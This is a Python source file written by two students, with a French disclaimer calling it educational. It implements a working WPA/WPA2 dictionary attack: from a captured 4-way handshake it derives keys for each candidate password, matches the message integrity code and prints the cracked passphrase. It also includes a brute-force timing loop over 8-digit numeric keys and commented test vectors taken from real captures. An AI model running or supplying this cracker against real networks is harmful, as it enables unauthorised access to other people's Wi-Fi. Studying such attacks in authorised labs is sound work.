# -*- coding: utf-8 -*-

# Date       :    02/12/2019
# Authors    :    Damien LAURENT, Mathilde MERLAND
# State      :    OK


#----------DISCLAIMER------------#

# Ces implémentations Python ont été utilisées
# sur un réseau personnel privé, dont les auteurs sont propriétaires.
# Nous rappelons que les écoutes réseaux et tentatives d'attaques sont
# légalement interdites sans l'accord explicite du propriétaire dudit
# réseau. Ce type de comportements constitue un délit (art. 323-1 à 323-7 du code pénal)
# répréhensible de 2 ans d'emprisonnement et de 30 000€ d'amende. Les attaques
# implémentées ont un but pédagogique et scientifique.
# Les auteurs ne pourraient être tenus pour responsables de tout
# comportement illicite au regard de la loi résultant de l'utilisation
# du présent travail dans un contexte non autorisé.

#--------------------------------#

import sys
sys.path.append("..")

from hashlib import pbkdf2_hmac, md5, sha1
import hmac
import time
from PRF.PRF import PRF
from PRF.PRF import MakeAB
from Dictionary.read_dico import read_dico
from Reseau.read_cap import read_cap

#CONSTANTES

ssid = 'DO_NOT_CONNECT_Linksys'
MAC_STATION = ''
MAC_AP = ''
NONCE_AP = ''
NONCE_S = ''
REAL_PTK = ''


def crack_wpa(protocol, file):
    """ Crack la clé WPA ou WPA2 à partir d'un ficher file (.cap) contenant le 4-way handshake.
    Le protocole doit être préciser : "wpa1" ou "wpa2". """

    boolean = False

    nonceAP, nonceS, MAC_ap, MAC_station, MIC_msg_4, msg_4_wo_MIC = read_cap(file)
    dico = read_dico("dictionary.txt","Dictionary")
    for pwd in dico:
        pmk = pbkdf2_hmac('sha1', pwd.encode('ascii'), ssid.encode('ascii'), 4096, 32)
        (A, B) = MakeAB(nonceAP, nonceS, MAC_ap, MAC_station)
        ptk = PRF(pmk, A, B)


        if protocol == "wpa2":
            MIC_to_test = hmac.new(ptk[0:16], msg_4_wo_MIC, sha1).digest()[0:16]
        elif protocol == "wpa1":
            MIC_to_test = hmac.new(ptk[0:16], msg_4_wo_MIC, md5).digest()

        if MIC_to_test == MIC_msg_4 :
            boolean = True
            print("Trouvé ! Le PWD est : "+ pwd)
    if not boolean:
        print("Le PWD recherché n'est pas présent dans le dictionnaire")


def calcul_mic(pwd, ssid, mac_ap, mac_s, nonce_a, nonce_s, trame_sans_mic, mic, protocol):
    pmk = pbkdf2_hmac('sha1', pwd.encode('ascii'), ssid.encode('ascii'), 4096, 32)
    (A, B) = MakeAB(nonce_a, nonce_s, mac_ap, mac_s)
    ptk = PRF(pmk, A, B)
    if protocol == "wpa2":
        mic_to_test = hmac.new(ptk[0:16], trame_sans_mic, sha1).digest()[0:16]
    elif protocol == "wpa1":
        mic_to_test = hmac.new(ptk[0:16], trame_sans_mic, md5).digest()
    return mic_to_test


def Test_one_key(key, nonceAP, nonceS, MAC_ap, MAC_station, MIC_msg_4, msg_4_wo_MIC, ssid, protocol):
    mic_to_test = calcul_mic(key, ssid, MAC_ap, MAC_station, nonceAP, nonceS, msg_4_wo_MIC, MIC_msg_4, protocol)
    if MIC_msg_4 == mic_to_test:
        print("test")




#TEST
if __name__ == "__main__":
    file = "../Reseau/wpa_handshake_8-03.cap"
    crack_wpa("wpa2", file)


    #--------- TEST Temps de calcul pour une clé ----------------
    test_temps = 0
    if test_temps == 1 :
        nonceAP, nonceS, MAC_ap, MAC_station, MIC_msg_4, msg_4_wo_MIC = read_cap(file)
        ssid = 'DO_NOT_CONNECT_Linksys'
        protocol = 'wpa2'
        #DEMARRER TIMER
        start_time = time.time()
        for i in range(10**6):
            key = "0"* (8-len(str(i))) + str(i)
            Test_one_key(key, nonceAP, nonceS, MAC_ap, MAC_station, MIC_msg_4, msg_4_wo_MIC, ssid, protocol)
        #FIN TIMER
        end_time = time.time()
        time_execution = end_time - start_time
        one_time = time_execution / 10**6

        print(one_time)
        #result = 0.004018394629001617


#-----------------EXEMPLE-------------------#

#pwd = "secretsecret"
#ssid = "soho-psk"
#mac_ap = binascii.a2b_hex("0020 a64f 31e4".replace(" ",""))
#mac_s = binascii.a2b_hex("000c 41da f2e7".replace(" ",""))
#nonce_a = binascii.a2b_hex("477b a8dc 6d7e 80d0 1a30 9d35 891d 868e b82b cc3b 5d52 b5a9 a42c 4cb7 fd34 3a64".replace(" ",""))
#nonce_s = binascii.a2b_hex("ed12 afbd a8c5 8305 0032 e5b5 2953 82d2 7956 fd58 4a63 43ba fe49 135f 2695 2a0f".replace(" ",""))
#trame_sans_mic = binascii.a2b_hex("0103 005f fe01 0900 0000 0000 0000 0000 0200 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 000000 0000 0000 0000 0000 0000 0000 000000 00".replace(" ",""))
#mic = binascii.a2b_hex("f3a0 f691 4e28 a2df 1030 61a4 1ee8 3878".replace(" ",""))
#protocol = "wpa1"
#mic_0="0000 0000 0000 0000 0000 0000 0000 0000"

#calcul_mic(pwd, ssid, mac_ap, mac_s, nonce_a, nonce_s, trame_sans_mic, mic, protocol)


#-----------------EXEMPLE-------------------#
#La passphrase : radiustest
#Le SSID : linksys54gh
#MAC station : 000c 41d2 94fb
#MAC AP : 000d 3a26 10fb
#La PMK : 9e99 88bd e2cb a743 95c0 289f fda0 7bc4 1ffa 889a 3309 237a 2240 c934 bcdc 7ddb
#Le nonce AP : 893e e551 2145 57ff f3c0 76ac 9779 15a2 0607 2703 8e9b ea9b 6619 a5ba b40f 89c1
#Le nonce station : dabd c104 d457 411a ee33 8c00 fa8a 1f32 abfc 6cfb 7943 60ad ce3a fb5d 159a 51f6
#La PTK: ccbf 97a8 2b5c 51a4 4325 a77e 9bc5 7050 daec 5438 430f 00eb 893d 84d8 b4b4 b5e8 19f4 dce0 cc5f 2166 e94f db3e af68 eb76 80f4 e264 6e6d 9e36 260d 89ff bf24 ee7e
#La trame EAPOL numéro 4 sans le MIC : 0103 005f fe01 0900 0000 0000 0000 0000 1400 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 00
#Le MIC : d0ca 4f2a 783c 4345 b0c0 0a12 ecc1 5f77
#-------------------------------------------#


#-----------------EXEMPLE2------------------#

#ESSID is: soho-psk
#AA is: 0020 a64f 31e4
#SPA is:000c 41da f2e7
#snonce is:ed12 afbd a8c5 8305 0032 e5b5 2953 82d2 7956 fd58 4a63 43ba fe49 135f 2695 2a0f
#anonce is:477b a8dc 6d7e 80d0 1a30 9d35 891d 868e b82b cc3b 5d52 b5a9 a42c 4cb7 fd34 3a64
#keymic is:f3a0 f691 4e28 a2df 1030 61a4 1ee8 3878
#eapolframe is:0103 005f fe01 0900 0000 0000 0000 0000 0200 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 00f3 a0f6 914e 28a2 df10 3061 a41e e838 7800 00

#Starting dictionary attack. Please be patient.
#Testing passphrase: secretsecret
#Calculating PMK for "secretsecret".
#Calculating PTK with collected data and PMK.
#Calculating hmac-MD5 Key MIC for this frame.
#The PSK is "secretsecret".



#-------------------Notre cas-----------------------#
#pwd = "12345678"
#ssid = "DO_NOT_CONNECT_Linksys"
#mac_ap =binascii.a2b_hex("000f66e9ca2a")
#mac_s =binascii.a2b_hex("b46d832ba1fb")
#nonce_a = binascii.a2b_hex("4C 25 58 A3 EE D9 BF 0D FA 8B 0F 61 96 41 E2 FE 4D 4B F1 D1 53 41 3C 94 A9 59 CD B5 47 49 7B 79".replace(" ",""))
#nonce_s = binascii.a2b_hex("98 BB 58 1C A5 7D FF 92 02 5F D6 60 BC 17 7B F0 DD A0 DF D0 83 98 B1 30 90 1E EA 58 1D D0 A6 61".replace(" ",""))
#message_4_sans_mic_complet = binascii.a2b_hex("08 01 3A 01 00 0F 66 E9 CA 2A B4 6D 83 2B A1 FB 00 0F 66 E9 CA 2A B0 06 AA AA 03 00 00 00 88 8E 01 03 00 5F FE 01 09 00 20 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00".replace(" ",""))
#message_4_avec_mic_complet = binascii.a2b_hex("08 01 3A 01 00 0F 66 E9 CA 2A B4 6D 83 2B A1 FB 00 0F 66 E9 CA 2A B0 06 AA AA 03 00 00 00 88 8E 01 03 00 5F FE 01 09 00 20 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 03 13 DD 5B 87 81 3D 5F EF 96 FB EE 2F 5D 60 18 00 00".replace(" ",""))
#mic = binascii.a2b_hex("03 13 DD 5B 87 81 3D 5F EF 96 FB EE 2F 5D 60 18".replace(" ",""))
#protocol = 'wpa1'
#message_4_sans_entete_sans_mic = binascii.a2b_hex("01 03 00 5F FE 01 09 00 20 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00".replace(" ",""))
#entete_message_4 = binascii.a2b_hex("08 01 3A 01 00 0F 66 E9 CA 2A B4 6D 83 2B A1 FB 00 0F 66 E9 CA 2A B0 06 AA AA 03 00 00 00 88 8E ".replace(" ",""))
#message_4_pour_fonction = message_4_sans_entete_sans_mic
#calcul_mic(pwd, ssid, mac_ap, mac_s, nonce_a, nonce_s, message_4_pour_fonction, mic, protocol)
